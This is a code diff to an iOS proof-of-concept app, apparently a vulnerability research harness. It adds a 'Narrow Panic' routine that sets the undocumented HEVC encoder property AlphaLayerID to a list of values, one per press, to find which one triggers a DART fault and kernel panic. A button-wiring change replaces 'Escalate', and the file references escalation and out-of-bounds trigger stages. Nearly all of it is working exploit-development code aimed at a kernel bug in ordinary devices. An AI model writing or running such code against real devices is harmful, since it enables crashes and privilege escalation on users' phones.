@@ -1956,6 +1956,113 @@ static void runEscalation(void) {
 }
 
 // ============================================================
+// NARROW: Isolate which AlphaLayerID value triggers DART panic
+// Each press tests ONE value in a fresh session.
+// ============================================================
+
+static int g_narrowIndex = 0;
+static int g_narrowValues[] = {255, 63, 200, 128, 100, 64, 32, 62};
+static int g_narrowCount = 8;
+
+static void narrowOracleCallback(
+    void *ctx, void *sourceFrameRefCon, OSStatus status,
+    VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
+    if (status != noErr) {
+        FAIL(@"[Narrow] Encode callback error: %d", (int)status);
+        return;
+    }
+    if (sampleBuffer) {
+        PASS(@"[Narrow] Encode callback received — NO PANIC from this value");
+        bitstreamOracle(sampleBuffer, g_oracleContext ?: @"narrow");
+    }
+}
+
+static void runNarrowPanic(void) {
+    int val = g_narrowValues[g_narrowIndex % g_narrowCount];
+    g_narrowIndex++;
+
+    pocLog(@"");
+    pocLog(@"╔══════════════════════════════════════╗");
+    pocLog(@"║  NARROW: Single-Value DART Test        ║");
+    pocLog(@"║  *** CAN CAUSE KERNEL PANIC ***        ║");
+    pocLog(@"╚══════════════════════════════════════╝");
+    pocLog(@"");
+    LOG(@"Testing AlphaLayerID = %d (test %d/%d)", val, g_narrowIndex, g_narrowCount);
+    INFO(@"If phone reboots → THIS value triggers DART fault.");
+    INFO(@"If you see 'NO PANIC' → this value is safe, press again for next.");
+    pocLog(@"");
+
+    NSDictionary *spec = @{
+        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
+        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
+    };
+
+    VTCompressionSessionRef session = NULL;
+    OSStatus status = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+        narrowOracleCallback, NULL, &session);
+
+    if (status != noErr) {
+        FAIL(@"Session creation failed: %d", (int)status);
+        return;
+    }
+
+    status = VTSessionSetProperty(session,
+        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+        (__bridge CFTypeRef)@(val));
+    INFO(@"SET AlphaLayerID=%d: %s", val, status == noErr ? "OK" : "REJECTED");
+
+    CFTypeRef readBack = NULL;
+    VTSessionCopyProperty(session,
+        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+        kCFAllocatorDefault, &readBack);
+    if (readBack) {
+        INFO(@"READBACK: %@", (__bridge id)readBack);
+        CFRelease(readBack);
+    }
+
+    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
+    if (!pb) {
+        FAIL(@"Pixel buffer failed");
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        return;
+    }
+
+    g_oracleContext = [NSString stringWithFormat:@"Narrow_%d", val];
+    status = VTCompressionSessionPrepareToEncodeFrames(session);
+    INFO(@"PrepareToEncode: %d", (int)status);
+
+    if (status != noErr) {
+        FAIL(@"PrepareToEncode failed: %d", (int)status);
+        CVPixelBufferRelease(pb);
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        return;
+    }
+
+    INFO(@"*** ENCODING SINGLE FRAME — if phone reboots, AlphaLayerID=%d is the trigger ***", val);
+
+    status = VTCompressionSessionEncodeFrame(session, pb,
+        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+    INFO(@"EncodeFrame: %d", (int)status);
+
+    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    INFO(@"CompleteFrames done");
+
+    [NSThread sleepForTimeInterval:2.0];
+    PASS(@"=== AlphaLayerID=%d: SURVIVED (no DART fault after 2s) ===", val);
+
+    int next_val = g_narrowValues[g_narrowIndex % g_narrowCount];
+    INFO(@"Next press will test AlphaLayerID=%d", next_val);
+
+    CVPixelBufferRelease(pb);
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+}
+
+// ============================================================
 // Tier 1b: OOB trigger — ONLY for properties verified by oracle
 // ============================================================
 
@@ -2374,16 +2481,16 @@ static void runTier2Probe(void) {
 
     CGFloat row4 = row3 + btnH + gap;
 
-    UIButton *escalateBtn = [UIButton buttonWithType:UIButtonTypeSystem];
-    escalateBtn.frame = CGRectMake(pad, row4, btnW, btnH);
-    escalateBtn.backgroundColor = [UIColor colorWithRed:0.0 green:0.2 blue:0.0 alpha:1];
-    escalateBtn.layer.cornerRadius = 8;
-    escalateBtn.layer.borderWidth = 2;
-    escalateBtn.layer.borderColor = UIColor.greenColor.CGColor;
-    [escalateBtn setTitle:@"Escalate" forState:UIControlStateNormal];
-    [escalateBtn setTitleColor:UIColor.greenColor forState:UIControlStateNormal];
-    [escalateBtn addTarget:self action:@selector(runEscalate) forControlEvents:UIControlEventTouchUpInside];
-    [self.view addSubview:escalateBtn];
+    UIButton *narrowBtn = [UIButton buttonWithType:UIButtonTypeSystem];
+    narrowBtn.frame = CGRectMake(pad, row4, btnW, btnH);
+    narrowBtn.backgroundColor = [UIColor colorWithRed:0.3 green:0.15 blue:0.0 alpha:1];
+    narrowBtn.layer.cornerRadius = 8;
+    narrowBtn.layer.borderWidth = 2;
+    narrowBtn.layer.borderColor = [UIColor orangeColor].CGColor;
+    [narrowBtn setTitle:@"Narrow Panic" forState:UIControlStateNormal];
+    [narrowBtn setTitleColor:UIColor.orangeColor forState:UIControlStateNormal];
+    [narrowBtn addTarget:self action:@selector(runNarrow) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:narrowBtn];
 
     self.bothBtn = [UIButton buttonWithType:UIButtonTypeSystem];
     self.bothBtn.frame = CGRectMake(pad + btnW + gap, row4, btnW, btnH);
@@ -2451,6 +2558,12 @@ static void runTier2Probe(void) {
 - (void)runEscalate {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         runEscalation();
+    });
+}
+
+- (void)runNarrow {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        runNarrowPanic();
     });
 }
 
